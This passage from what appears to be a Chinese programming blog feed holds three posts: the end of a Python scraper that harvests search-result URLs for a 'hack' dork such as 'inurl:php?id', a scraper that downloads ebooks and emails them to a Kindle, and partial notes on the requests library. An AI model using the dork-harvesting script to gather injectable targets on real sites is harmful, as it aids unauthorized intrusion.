punctuation">(</span>mon<span class="token punctuation">)</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>day<span class="token punctuation">)</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hour<span class="token punctuation">)</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>min<span class="token punctuation">)</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>sec<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">openThefile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    1、打开要去重的文件    2、删除每行数据前后的无用字符    :return:    '''</span>    f<span class="token operator">=</span><span class="token string">"new_url.txt"</span>    ff <span class="token operator">=</span> open<span class="token punctuation">(</span>f<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>    l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#for i in ff.readline():     #readline是文件中的第一行内容</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> ff<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#所有内容中的每一行</span>        <span class="token keyword">if</span> i <span class="token operator">!=</span> <span class="token string">'\n'</span> <span class="token operator">and</span> i <span class="token operator">!=</span> <span class="token string">'\r\n'</span><span class="token punctuation">:</span>   <span class="token comment" spellcheck="true">#删除空行</span>            ii <span class="token operator">=</span> i<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ii<span class="token punctuation">)</span>    ff<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> l<span class="token keyword">def</span> <span class="token function">createNewfile</span><span class="token punctuation">(</span>openThefile<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    去重操作    :param openThefile:    :return:    '''</span>    l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> openThefile<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">not</span> <span class="token keyword">in</span> l<span class="token punctuation">:</span>            l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''    创建新文件    '''</span>    f<span class="token operator">=</span><span class="token string">"new_url.txt"</span>    filename <span class="token operator">=</span> f<span class="token punctuation">[</span><span class="token punctuation">:</span>f<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    postfix <span class="token operator">=</span> f<span class="token punctuation">[</span>f<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    theNewfile <span class="token operator">=</span> open<span class="token punctuation">(</span>filename <span class="token operator">+</span> <span class="token string">'_'</span> <span class="token operator">+</span> nowtime <span class="token operator">+</span> postfix<span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''    写入处理过的内容    '''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>        theNewfile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    theNewfile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    parser<span class="token operator">=</span>argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>description<span class="token operator">=</span><span class="token string">'自动化采集bing网站的爬虫'</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-u'</span><span class="token punctuation">,</span><span class="token string">'--your_url'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">"你的hack语句"</span><span class="token punctuation">,</span>type<span class="token operator">=</span>str<span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span><span class="token string">'--page_number'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">"你要爬取的页数最大范围"</span><span class="token punctuation">,</span>type<span class="token operator">=</span>int<span class="token punctuation">)</span>    args<span class="token operator">=</span>parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    Obtain_url<span class="token punctuation">(</span>args<span class="token punctuation">.</span>page_number<span class="token punctuation">,</span>args<span class="token punctuation">.</span>your_url<span class="token punctuation">)</span>    url<span class="token punctuation">(</span><span class="token punctuation">)</span>    createNewfile<span class="token punctuation">(</span>openThefile<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>调试了半天了，提前装好<code>selenium</code>库和谷歌浏览器的驱动，使用方法例如：</p><pre><code>python 1.py -u inurl:php?id -p 100</code></pre><p>意思是使用谷歌关键字<code>inurl:php?id</code>然后爬取<code>100/10</code>以内的页数</p>]]></content>
      
      
      
        <tags>
            
            <tag> python黑客编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手写python爬虫下载电子书一键发送到kindle</title>
      <link href="/2019/04/12/shou-xie-python-pa-chong-xia-zai-dian-zi-shu-yi-jian-fa-song-zhi-kindle/"/>
      <url>/2019/04/12/shou-xie-python-pa-chong-xia-zai-dian-zi-shu-yi-jian-fa-song-zhi-kindle/</url>
      
        <content type="html"><![CDATA[<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><p>由于平时喜欢看书，但是发现一些推送的服务号没有自己想要的电子书，最近再学习爬虫，就想小试牛刀，主要用到的技术：</p><p>使用<code>python</code>的<code>requests</code>模块进行网站信息的爬取</p><p>解析我使用了两个方式，正则表达式和<code>pyquery</code>库进行<code>html</code>的解析</p><p>由于<code>kindle</code>推送，主要使用的是邮箱发送的方式，所以使用<code>python</code>已经封装好的<code>email</code>模块和<code>smtplib</code>模块，发送附件至你的<code>kindle</code>邮箱<br>主要的功能模块实现：</p><p>检索书籍然后推送至<code>kindle</code><br>排行榜推送至<code>kindle</code></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21b86yodbj31gs0rzq55.jpg" alt><br><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21b86vr1nj30zh0iajsv.jpg" alt></p><h2 id="2-各模块实现"><a href="#2-各模块实现" class="headerlink" title="2.各模块实现"></a>2.各模块实现</h2><h3 id="2-1-排行榜采集模块"><a href="#2-1-排行榜采集模块" class="headerlink" title="2.1 排行榜采集模块"></a>2.1 排行榜采集模块</h3><p>采集网页信息<br>主要使用的是<code>requests</code>模块。</p><pre><code>def spider_qishu(url,headers):    response=requests.get(url,headers=headers)    if response.status_code==200:        return response.text    return None</code></pre><p>函数功能：<code>get</code>请求将网页的内容读取</p><p>解析<code>html</code>中的关键信息，并将其返回</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">tuijian</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">:</span>    result<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'&lt;font>(.*?)&lt;/font>.*?&lt;u style=.*?&lt;em>(.*?)&lt;/em>&lt;a href="(.*?)">(.*?)&lt;/a>&lt;/u>'</span><span class="token punctuation">,</span>html<span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>    paihangbang<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'&lt;h2>(.*?)&lt;/h2>'</span><span class="token punctuation">,</span>html<span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>paihangbang<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    results<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> result<span class="token punctuation">:</span>        t<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>        t<span class="token punctuation">[</span><span class="token string">'index'</span><span class="token punctuation">]</span><span class="token operator">=</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        t<span class="token punctuation">[</span><span class="token string">'author'</span><span class="token punctuation">]</span><span class="token operator">=</span>item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        t<span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span><span class="token operator">=</span>item<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        t<span class="token punctuation">[</span><span class="token string">'book_name'</span><span class="token punctuation">]</span><span class="token operator">=</span>item<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>        results<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> results<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'序号:'</span><span class="token operator">+</span>i<span class="token punctuation">[</span><span class="token string">'index'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'  作者:'</span><span class="token operator">+</span>i<span class="token punctuation">[</span><span class="token string">'author'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">' 书名:'</span><span class="token operator">+</span>i<span class="token punctuation">[</span><span class="token string">'book_name'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">' 链接:'</span><span class="token operator">+</span>i<span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> results</code></pre><p>这里将解析的结果存放再<code>results</code>，<code>results</code>是一个列表，然后它的每个元素是一个字典，分别存储序号，作者，书名，以及书的链接，这个链接的网页存在着下载地址，下面我们还要将其爬取，解析其下载地址。</p><p>下载模块:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>number<span class="token punctuation">,</span>results<span class="token punctuation">,</span>base_url<span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span class="token punctuation">:</span>    number<span class="token operator">=</span>int<span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>    extend_url<span class="token operator">=</span>results<span class="token punctuation">[</span>number<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span>    url<span class="token operator">=</span>base_url<span class="token operator">+</span>extend_url    headers<span class="token punctuation">[</span><span class="token string">'Referer'</span><span class="token punctuation">]</span><span class="token operator">=</span>url    response<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    content<span class="token operator">=</span>response<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    out<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'get_down_url.*?,\'(.*?)\','</span><span class="token punctuation">,</span>content<span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>    download_url<span class="token operator">=</span>out<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>download_url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'正在下载请耐心等候。。。。。。。\n'</span><span class="token punctuation">)</span>    filename<span class="token operator">=</span>results<span class="token punctuation">[</span>number<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'book_name'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'.txt'</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>download_url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> open<span class="token punctuation">(</span>filename<span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>    <span class="token keyword">except</span> RequestException <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">return</span> filename </code></pre><p>首先我们从链接地址中得到网页，然后用正则表达式解析网页获得下载地址，然后将其写入文件，最后使用我们封装的<code>send_email</code>函数将其发送至<code>kindle</code></p><p>总结：解析网页这边使用的是正则表达式，发现正则表达式很不方便，很容易写错，十分麻烦。所以推荐再解析库的使用上使用<code>lxml</code>模块，或者使用<code>pyquery</code>模块，两个的解析速度都很快，<code>beautiful soup</code>很慢，而且它的<code>css</code>选择器没有<code>pyquery</code>模块的强大，如果你对j<code>query</code>熟悉的话，推荐使用<code>pyquery</code>模块。</p><h3 id="2-2-检索下载电子书"><a href="#2-2-检索下载电子书" class="headerlink" title="2.2 检索下载电子书"></a>2.2 检索下载电子书</h3><p>思路还是和上面的一样，不过再解析<code>html</code>网页我使用的是<code>pyquery</code>模块，它主要是根据<code>css</code>选择节点，进行网页的解析，速度很快，而且很方便。</p><p>分页模块</p><p>当你搜索一本书的时候，可能相似的书有很多，网页会将其分页，我们使用<code>fiddler</code>分析网页的请求过程，首先网页会将<code>20</code>个书分为一页，然后再<code>get</code>请求的时候会添加一个<code>page</code>字段，所以我们首先得得到一共检索有<code>numbe</code>r本书，然后用<code>math</code>模块的<code>ceil</code>方法，对<code>number/20</code>取上，最后得到网页的页数，我们再迭代对每一页发出请求解析到每本书所在的链接。在做这个模块的时候，我不幸踩到了坑，网页的请求<code>url</code>地址中的<code>word</code>字段编码是<code>gb2312</code>,所以这边需要进行编码。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">page_parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    href<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    name_href<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    base_url<span class="token operator">=</span><span class="token string">'http://www.qishu.cc/search.asp'</span>    keyword<span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token string">"请输入你要搜索的书籍:\n"</span><span class="token punctuation">)</span>    data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    data<span class="token punctuation">[</span><span class="token string">'word'</span><span class="token punctuation">]</span><span class="token operator">=</span>keyword<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gb2312'</span><span class="token punctuation">)</span>    response<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>    doc<span class="token operator">=</span>pq<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    spans<span class="token operator">=</span>doc<span class="token punctuation">(</span><span class="token string">'#searchmain .searchResult span:first-child'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"一共拥有"</span><span class="token operator">+</span>spans<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"本书:\n"</span><span class="token punctuation">)</span>    numbers<span class="token operator">=</span>int<span class="token punctuation">(</span>spans<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    pages<span class="token operator">=</span>math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>numbers<span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">)</span>     <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>pages<span class="token punctuation">)</span><span class="token punctuation">:</span>        i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span>        data<span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token operator">=</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        new_response<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        links<span class="token punctuation">,</span>names<span class="token operator">=</span>search<span class="token punctuation">(</span>new_response<span class="token punctuation">,</span>href<span class="token punctuation">,</span>name_href<span class="token punctuation">)</span>    <span class="token keyword">return</span> links<span class="token punctuation">,</span>names</code></pre><p>检索所有书籍模块<br>使用循环迭代，将书籍打印出来，并存储所在的页面信息，书所在的链接，名字</p><pre><code>def search(response,href,name_href):    response.encoding=&#39;gb2312&#39;    doc=pq(response.text)    results=doc(&#39;#searchmain .searchTopic&#39;).items()    for result in results:        a=result.find(&#39;a&#39;).remove(&#39;font&#39;)        result.find(&#39;a&#39;).remove()        print(&#39;序号   &#39;+result.text().rstrip(&#39;、&#39;))        print(&#39;书名   &#39;+a.text())        print(&#39;链接   &#39;+a.attr(&#39;href&#39;))        href[result.text().rstrip(&#39;、&#39;)]=a.attr(&#39;href&#39;)        name_href[result.text().rstrip(&#39;、&#39;)]=a.text()    return href,name_href</code></pre><p>下载模块</p><p>使用上面得到的链接，然后找到书所在的页面，解析下载地址，然后写入文件，返回文件名</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">download_search</span><span class="token punctuation">(</span>links<span class="token punctuation">,</span>number<span class="token punctuation">,</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    base_url<span class="token operator">=</span><span class="token string">'http://www.qishu.cc'</span>    <span class="token keyword">for</span> key<span class="token punctuation">,</span>value <span class="token keyword">in</span> links<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> key<span class="token operator">==</span>number<span class="token punctuation">:</span>            url<span class="token operator">=</span>base_url<span class="token operator">+</span>value    response<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    response<span class="token punctuation">.</span>encoding<span class="token operator">=</span><span class="token string">'gb2312'</span>    content<span class="token operator">=</span>pq<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    temp<span class="token operator">=</span>content<span class="token punctuation">(</span><span class="token string">'#downAddress a:gt(0)'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span>    download_url<span class="token operator">=</span>temp<span class="token punctuation">.</span>attr<span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>download_url<span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> open<span class="token punctuation">(</span>filename<span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>    <span class="token keyword">except</span> RequestException <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'下载完成'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> filename </code></pre><h3 id="2-3-邮箱推送模块"><a href="#2-3-邮箱推送模块" class="headerlink" title="2.3 邮箱推送模块"></a>2.3 邮箱推送模块</h3><p>下面只要将<code>qq</code>邮箱和<code>16</code>位授权码、<code>kindle</code>邮箱地址替换成你的就可以使用了,<code>send_mail</code>我将除了<code>filename</code>之外的所有形参设置成默认参数，这样不用调用的使用给他传值。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># -*- coding: UTF-8 -*-</span><span class="token keyword">import</span> smtplib<span class="token keyword">import</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>multipart<span class="token keyword">import</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>text<span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>text <span class="token keyword">import</span> MIMEText<span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>multipart <span class="token keyword">import</span> MIMEMultipart<span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>application <span class="token keyword">import</span> MIMEApplication<span class="token keyword">def</span> <span class="token function">send_email</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span>smtpHost<span class="token operator">=</span><span class="token string">'smtp.qq.com'</span><span class="token punctuation">,</span> sendAddr<span class="token operator">=</span><span class="token string">'qq邮箱'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'16位授权码'</span><span class="token punctuation">,</span> recipientAddrs<span class="token operator">=</span><span class="token string">'kindle邮箱地址'</span><span class="token punctuation">,</span> subject<span class="token operator">=</span><span class="token string">'kindle推送'</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">'推送小说'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    msg <span class="token operator">=</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>multipart<span class="token punctuation">.</span>MIMEMultipart<span class="token punctuation">(</span><span class="token punctuation">)</span>    msg<span class="token punctuation">[</span><span class="token string">'from'</span><span class="token punctuation">]</span> <span class="token operator">=</span> sendAddr    msg<span class="token punctuation">[</span><span class="token string">'to'</span><span class="token punctuation">]</span> <span class="token operator">=</span> recipientAddrs    msg<span class="token punctuation">[</span><span class="token string">'subject'</span><span class="token punctuation">]</span> <span class="token operator">=</span> subject    content <span class="token operator">=</span> content    txt <span class="token operator">=</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>text<span class="token punctuation">.</span>MIMEText<span class="token punctuation">(</span>content<span class="token punctuation">,</span> <span class="token string">'plain'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>    msg<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>txt<span class="token punctuation">)</span>    part <span class="token operator">=</span> MIMEApplication<span class="token punctuation">(</span>open<span class="token punctuation">(</span>filename<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    part<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">,</span> <span class="token string">'attachment'</span><span class="token punctuation">,</span> filename<span class="token operator">=</span>filename<span class="token punctuation">)</span>    msg<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>part<span class="token punctuation">)</span>    smtp <span class="token operator">=</span> smtplib<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span><span class="token punctuation">)</span>    smtp<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>smtpHost<span class="token punctuation">,</span> <span class="token string">'25'</span><span class="token punctuation">)</span>    smtp<span class="token punctuation">.</span>login<span class="token punctuation">(</span>sendAddr<span class="token punctuation">,</span> password<span class="token punctuation">)</span>    smtp<span class="token punctuation">.</span>sendmail<span class="token punctuation">(</span>sendAddr<span class="token punctuation">,</span> recipientAddrs<span class="token punctuation">,</span> str<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"发送成功！"</span><span class="token punctuation">)</span>    smtp<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>总结:还可以在爬取分页数据的时候，采用多线程，这样就会速度很快，然后下载的时候可以做个进度条。</p>]]></content>
      
      
      
        <tags>
            
            <tag> python爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于python爬虫的一些学习总结</title>
      <link href="/2019/04/12/guan-yu-pa-chong-de-yi-xie-zong-jie-ji-ben-ku/"/>
      <url>/2019/04/12/guan-yu-pa-chong-de-yi-xie-zong-jie-ji-ben-ku/</url>
      
        <content type="html"><![CDATA[<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><p>上一次讲了<code>urllib</code>库的使用，但是其中有很多的不方便，处理网页验证和<code>Cookie</code>时候，需要写<code>opener</code>和<code>hanler</code>出咯，为了方便实现这些操作，需要有一个更加强大库，<code>requests</code>,它在<code>COOkie</code>、登陆验证、代理设置等操作十分简洁。</p><h2 id="2-requests库基本用法"><a href="#2-requests库基本用法" class="headerlink" title="2. requests库基本用法"></a>2. requests库基本用法</h2><h3 id="2-1-GET请求"><a href="#2-1-GET请求" class="headerlink" title="2.1 GET请求"></a>2.1 GET请求</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsr<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'type(r)\n'</span><span class="token punctuation">,</span>type<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'code(r)\n'</span><span class="token punctuation">,</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'text(r)\n'</span><span class="token punctuation">,</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'cookie(r)\n'</span><span class="token punctuation">,</span>r<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span></code></pre><p>如何添加请求的字段呢？</p><p>两种方法：</p><p>一种是<code>get</code>请求直接在<code>url</code>里面，但是这样很麻烦。 </p><p>第二种是：设置一个字典，设置其健值对，然后使用<code>params</code>参数传给<code>requests.get(url=&#39;&#39;,params=&#39;&#39;)</code>,<code>r.text()</code>是<code>str</code>格式，如果想直接解析返回结果，得到字典的话，可以直接调用<code>json（方法）</code>，<code>r.json()</code>将<code>str</code>格式转换为字典格式。</p><p>如何抓取二进制数据？</p><p>页面是<code>html</code>文档，如果抓图片视频等文件，得拿到它们的二进制码。使用<code>r.content()</code>方法得到二进制码，然后将其以二进制的形式写入文档。</p><p>如何添加<code>headers</code>?</p><p>生成一个<code>headers</code>字典，给其键值对赋值，然后将其加入<code>get</code>方法的<code>headers</code>参数。</p><h3 id="2-2-POST请求"><a href="#2-2-POST请求" class="headerlink" title="2.2 POST请求"></a>2.2 POST请求</h3><pre><code>requests.post(url=&#39;&#39;,data=&#39;&#39;,headers=&#39;&#39;)</code></pre><p><code>data</code>是请求的表单数据，<code>haeders</code>依然是头。</p><p>如何知道请求的数据是成功的？</p><p>使用<code>r.status_code</code>可以获得状态码，如果得到的是<code>200</code>就是返回请求页面，其他的状态码其他部分可以查询网上参考。</p><p>当然响应头也可以通过<code>r.headers</code>得到它是一个字典，然后响应的<code>cookie</code>也可以通过<code>r.cookie</code>得到。</p><p><code>requests</code>还提供内置的状态码查询对象<code>erquests.codes</code>可以判断请求是否成功</p><pre><code>exit() if not r.status_code==requests.codes.ok else print(&#39;Requests successfully&#39;)</code></pre><h3 id="2-3-文件上传"><a href="#2-3-文件上传" class="headerlink" title="2.3 文件上传"></a>2.3 文件上传</h3><pre class=" language-python"><code class="language-python">files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span>open<span class="token punctuation">(</span><span class="token string">'文件名’，‘rb'</span><span class="token punctuation">)</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>files<span class="token operator">=</span>files<span class="token punctuation">)</span></code></pre><p>响应体里面会包含<code>files</code>这个字段，而<code>form</code>字段是空的，文件上传会单独有一个<code>files</code>字段来标识。</p><h3 id="2-4-Cookies设置"><a href="#2-4-Cookies设置" class="headerlink" title="2.4 Cookies设置"></a>2.4 Cookies设置</h3><p><code>get</code>方式获取<code>cookie</code></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsr<span class="token operator">=</span>requests<span class="token 